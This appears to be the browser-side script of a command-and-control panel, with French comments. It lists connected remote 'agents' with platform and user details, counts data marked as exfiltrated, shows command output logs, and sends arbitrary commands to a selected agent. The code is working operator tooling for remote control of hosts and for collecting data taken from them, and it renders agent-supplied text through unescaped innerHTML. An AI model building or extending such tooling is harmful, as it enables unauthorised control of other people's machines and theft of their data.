document.addEventListener('DOMContentLoaded', () => {
    const agentList = document.getElementById('agent-list');
    const agentSelect = document.getElementById('agent-select');
    const commandInput = document.getElementById('command-input');
    const sendCommandBtn = document.getElementById('send-command');
    const commandHistoryList = document.getElementById('command-history-list');
    const logsContainer = document.getElementById('logs-container');
    const activeAgentsSpan = document.getElementById('active-agents');
    const pendingCommandsSpan = document.getElementById('pending-commands');
    const exfilDataSpan = document.getElementById('exfil-data');
    
    let selectedAgent = null;
    let refreshInterval = null;
    
    // Fonction pour mettre à jour les statistiques
    async function updateStats() {
        try {
            const response = await fetch('/agents');
            const data = await response.json();
            
            activeAgentsSpan.textContent = data.agents.length;
            
            // Calcul des commandes en attente
            const pendingCommands = data.agents.reduce(
                (total, agent) => total + agent.commandCount, 0
            );
            pendingCommandsSpan.textContent = pendingCommands;
            
            // Mise à jour des données exfiltrées
            if (selectedAgent) {
                const exfilResponse = await fetch(`/monitor/${selectedAgent}/exfiltrated`);
                const exfilData = await exfilResponse.json();
                exfilDataSpan.textContent = exfilData.data?.length || 0;
            }
        } catch (error) {
            console.error('Error updating stats:', error);
        }
    }
    
    // Fonction pour charger les agents
    async function loadAgents() {
        try {
            const response = await fetch('/agents');
            const data = await response.json();
            
            agentList.innerHTML = '';
            agentSelect.innerHTML = '<option value="">Sélectionner un agent</option>';
            
            data.agents.forEach(agent => {
                // Ajout à la liste des agents
                const agentCard = document.createElement('div');
                agentCard.className = 'agent-card';
                if (selectedAgent === agent.id) {
                    agentCard.classList.add('active');
                }
                
                agentCard.innerHTML = `
                    <h3>${agent.id}</h3>
                    <div class="agent-info">
                        <div><strong>Platform:</strong> ${agent.info.platform || 'N/A'}</div>
                        <div><strong>User:</strong> ${agent.info.user || 'N/A'}</div>
                        <div><strong>Last Seen:</strong> ${new Date(agent.lastSeen).toLocaleString()}</div>
                        <div><strong>Pending Commands:</strong> ${agent.commandCount}</div>
                    </div>
                `;
                
                agentCard.addEventListener('click', () => {
                    selectedAgent = agent.id;
                    loadAgentDetails(agent.id);
                    loadCommandHistory(agent.id);
                    document.querySelectorAll('.agent-card').forEach(card => {
                        card.classList.remove('active');
                    });
                    agentCard.classList.add('active');
                });
                
                agentList.appendChild(agentCard);
                
                // Ajout au menu déroulant
                const option = document.createElement('option');
                option.value = agent.id;
                option.textContent = agent.id;
                agentSelect.appendChild(option);
            });
            
            updateStats();
        } catch (error) {
            console.error('Error loading agents:', error);
        }
    }
    
    // Fonction pour charger les détails d'un agent
    async function loadAgentDetails(agentId) {
        try {
            const response = await fetch(`/monitor/${agentId}`);
            const data = await response.json();
            
            logsContainer.innerHTML = '';
            
            data.logs.forEach(log => {
                const logEntry = document.createElement('div');
                logEntry.className = 'log-entry';
                
                logEntry.innerHTML = `
                    <div class="log-time">${log.time}</div>
                    <pre class="log-content">${log.result}</pre>
                `;
                
                logsContainer.appendChild(logEntry);
            });
            
            // Faire défiler vers le bas
            logsContainer.scrollTop = logsContainer.scrollHeight;
        } catch (error) {
            console.error('Error loading agent details:', error);
        }
    }
    
    // Fonction pour charger l'historique des commandes
    async function loadCommandHistory(agentId) {
        try {
            const response = await fetch(`/monitor/${agentId}/commands/history`);
            const data = await response.json();
            
            commandHistoryList.innerHTML = '';
            
            data.history.forEach(item => {
                const li = document.createElement('li');
                li.innerHTML = `
                    <strong>${new Date(item.timestamp).toLocaleString()}:</strong>
                    <code>${item.command}</code>
                `;
                commandHistoryList.appendChild(li);
            });
        } catch (error) {
            console.error('Error loading command history:', error);
        }
    }
    
    // Envoyer une commande
    sendCommandBtn.addEventListener('click', async () => {
        const command = commandInput.value.trim();
        const agentId = agentSelect.value;
        
        if (!command || !agentId) {
            alert('Veuillez sélectionner un agent et saisir une commande');
            return;
        }
        
        try {
            const response = await fetch(`/monitor/${agentId}/commands`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ command })
            });
            
            const result = await response.json();
            
            if (response.ok) {
                commandInput.value = '';
                loadCommandHistory(agentId);
                updateStats();
            } else {
                alert(`Erreur: ${result.error || 'Unknown error'}`);
            }
        } catch (error) {
            console.error('Error sending command:', error);
            alert('Erreur de communication avec le serveur');
        }
    });
    
    // Initialisation
    loadAgents();
    refreshInterval = setInterval(loadAgents, 5000);
    
    // Nettoyage à la fermeture
    window.addEventListener('beforeunload', () => {
        if (refreshInterval) clearInterval(refreshInterval);
    });
});